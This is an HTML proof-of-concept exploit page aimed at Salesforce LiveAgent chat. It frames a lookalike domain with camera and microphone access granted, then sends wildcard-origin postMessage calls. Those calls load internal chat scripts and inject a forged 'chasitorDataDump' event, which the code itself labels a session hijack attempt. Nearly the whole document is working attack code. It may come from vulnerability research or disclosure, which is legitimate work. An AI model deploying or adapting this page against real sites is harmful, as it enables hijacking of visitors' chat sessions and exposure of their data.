<!DOCTYPE html>
<html>
<head>
  <title>Salesforce Message Injection PoC</title>
</head>
<body>
  <h2>Salesforce LiveAgent iframe injection PoC</h2>

  <iframe
    id="eswFrame"
    src="https://reddit.com.wangdubruh.xyz"
    style="width:600px;height:400px;"
    onload="onIframeLoad()"
    allow="camera *; microphone *;">
  </iframe>

  <script>
    const iframe = document.getElementById("eswFrame");

    window.addEventListener("message", (e) => {
      console.log("ðŸ“© Message from iframe:", e.data);
    });

    function sendFakeEvent() {
      console.log("ðŸ“¤ Sending fake event to dump session info");
      iframe.contentWindow.postMessage({
        method: "liveagent.event",
        data: {
          event: "chasitorDataDump",
          params: {
            key: "POC",
            value: "Session hijack attempt"
          },
          chasitorData: {
            orgId: "00Dxx0000000000",
            chatKey: "FAKEKEY123",
            visitorInfo: {
              name: "Victim",
              location: "internal"
            }
          }
        }
      }, "*");
    }

    function onIframeLoad() {
      console.log("[+] Iframe loaded (Salesforce 4.0)");

      // Load internal scripts
      iframe.contentWindow.postMessage({ method: "script.load", feature: "chasitor" }, "*");
      iframe.contentWindow.postMessage({ method: "script.load", feature: "filetransfer" }, "*");

      // Delay to give time for handlers to bind
      setTimeout(sendFakeEvent, 1500);
    }
  </script>
</body>
</html>
